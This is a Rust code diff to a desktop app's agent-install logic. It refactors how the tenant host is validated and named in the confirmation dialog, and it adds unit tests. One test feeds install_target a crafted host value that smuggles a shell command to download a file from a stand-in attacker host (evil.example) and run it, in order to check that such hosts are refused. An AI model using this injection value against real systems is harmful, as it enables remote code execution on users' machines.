@@ -125,7 +125,7 @@ const MAX_INSTALL_ARG_LEN: usize = 128;
 /// None of those need anything a shell or PowerShell reads as syntax, so the
 /// command carries them unquoted exactly as the copied one does. A leading `-`
 /// is refused because the agent's CLI would take the value for a flag.
-fn is_install_arg(value: &str) -> bool {
+pub(crate) fn is_install_arg(value: &str) -> bool {
     (1..=MAX_INSTALL_ARG_LEN).contains(&value.len())
         && !value.starts_with('-')
         && value
@@ -195,8 +195,15 @@ fn server_arg(origin: &url::Url) -> String {
     if crate::is_loopback_host(origin.host_str().unwrap_or_default()) {
         "localhost --localMode".to_string()
     } else {
-        origin.authority().to_string()
+        enrolled_host(origin)
     }
+}
+
+/// The tenant at `origin` as the agent enrols with it, and so as the dialog and the
+/// admin prompt have to name it.
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn enrolled_host(origin: &url::Url) -> String {
+    origin.authority().to_string()
 }
 
 /// The install command, identical to `buildInstallCommand` in apps/web for the
@@ -268,17 +275,16 @@ fn confirmed_by_user(window: &WebviewWindow, tenant_host: &str) -> bool {
 
 /// The tenant to install against: the one login taught the shell, held to the
 /// same rule as when it was learned, because `config.json` may predate the rule.
-#[cfg(any(target_os = "macos", target_os = "windows"))]
-fn install_target(app: &AppHandle) -> Result<url::Url, InstallError> {
-    let cfg = crate::load_config(app);
-    let host = crate::tenant_host(&cfg)
+#[cfg(any(target_os = "macos", target_os = "windows", test))]
+fn install_target(cfg: &crate::AppConfig) -> Result<url::Url, InstallError> {
+    let host = crate::tenant_host(cfg)
         .ok_or_else(|| InstallError::unavailable("no workspace to install for"))?;
-    let origin =
-        crate::tenant_origin(&host, crate::shared_host(&cfg).as_deref()).map_err(|error| {
+    crate::tenant_origin(&host, crate::shared_host(cfg).as_deref())
+        .and_then(|origin| url::Url::parse(&origin).map_err(|error| error.to_string()))
+        .map_err(|error| {
             log::warn!("agent install: refusing the learned tenant host: {error}");
             InstallError::unavailable("the workspace host is not one this app may install from")
-        })?;
-    url::Url::parse(&origin).map_err(InstallError::io)
+        })
 }
 
 #[derive(Clone, Serialize)]
@@ -332,8 +338,8 @@ pub fn agent_install_start(
     #[cfg(any(target_os = "macos", target_os = "windows"))]
     {
         use std::sync::atomic::Ordering;
-        let origin = install_target(&app)?;
-        let tenant_host = origin.authority().to_string();
+        let origin = install_target(&crate::load_config(&app))?;
+        let tenant_host = enrolled_host(&origin);
         // The page keeps running in a window hidden to the tray, and a dialog
         // attached to a window nobody can see would be waiting on nobody.
         if !window.is_visible().unwrap_or(false) {
@@ -851,9 +857,33 @@ mod tests {
     }
 
     #[test]
-    fn the_server_arg_keeps_a_port() {
+    fn the_dialog_names_the_host_the_agent_enrols_with() {
         let tenant = origin("https://acme.openframe.ai:8443");
-        assert_eq!(server_arg(&tenant), "acme.openframe.ai:8443");
+        assert_eq!(enrolled_host(&tenant), "acme.openframe.ai:8443");
+        assert_eq!(server_arg(&tenant), enrolled_host(&tenant));
+        let (_, description) = confirmation_text(&enrolled_host(&tenant));
+        assert!(description.contains("\n\nacme.openframe.ai:8443\n\n"));
+    }
+
+    /// `config.json` may hold a host from before the rule, so the install holds it to
+    /// the rule again rather than trusting what login stored.
+    #[test]
+    fn a_crafted_learned_host_is_refused_at_install() {
+        let cfg = |learned: Option<&str>| crate::AppConfig {
+            shared_host: Some("https://openframe.ai".into()),
+            learned_host: learned.map(str::to_string),
+            ..crate::AppConfig::default()
+        };
+        let target = install_target(&cfg(Some("https://acme.openframe.ai"))).unwrap();
+        assert_eq!(target.as_str(), "https://acme.openframe.ai/");
+        for learned in [
+            Some("https://x';{curl,-o,a,evil.example};{sh,a};'.openframe.ai"),
+            Some("https://evil.example"),
+            None,
+        ] {
+            let error = install_target(&cfg(learned)).unwrap_err();
+            assert_eq!(error.kind, "unavailable", "{learned:?}");
+        }
     }
 
     #[test]
